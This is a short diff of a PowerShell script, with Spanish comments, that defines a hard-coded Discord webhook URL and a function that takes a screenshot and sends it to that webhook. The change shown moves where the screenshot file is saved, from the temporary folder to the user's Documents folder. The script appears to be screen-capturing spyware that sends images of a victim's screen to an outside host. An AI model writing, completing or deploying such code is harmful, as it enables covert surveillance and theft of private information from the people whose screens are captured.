@@ -4,7 +4,7 @@ $webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2
 # Función para tomar una captura de pantalla y enviarla al webhook
 function Send-ScreenshotToDiscord {
     # Definir el nombre del archivo de la captura de pantalla
-    $fileName = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
+    $fileName = "$env:USERPROFILE\Documents\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
     
     # Tomar la captura de pantalla
     Add-Type -AssemblyName System.Windows.Forms
